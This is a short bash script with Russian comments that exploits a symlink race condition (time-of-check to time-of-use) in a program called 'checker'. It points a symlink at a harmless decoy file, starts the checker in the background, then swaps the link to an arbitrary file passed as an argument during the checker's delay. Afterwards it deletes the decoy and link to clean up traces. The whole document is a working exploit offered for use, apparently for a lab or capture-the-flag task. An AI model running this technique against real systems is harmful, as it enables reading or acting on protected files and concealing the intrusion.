#!/bin/bash

# Использование: bash checker-exploit.sh <ФАЙЛ>

# Создаем пустой файл, который будет нашим "прикрытием"
touch .fake

# Создаем связующее звено - символическую ссылку на .fake, которую мы подменим далее
ln -s .fake .pivot

# На фоне запускаем чекер и ждем полсекунды, чтобы попасть в окно секундной задержки
checker .pivot &
sleep 0.5

# Подменяем символическую ссылку на другой файл, переданный скрипту в 1-м аргументе
ln -sf $1 .pivot

# Ждем еще полсекунды и чистим следы
sleep 0.5
rm .fake .pivot
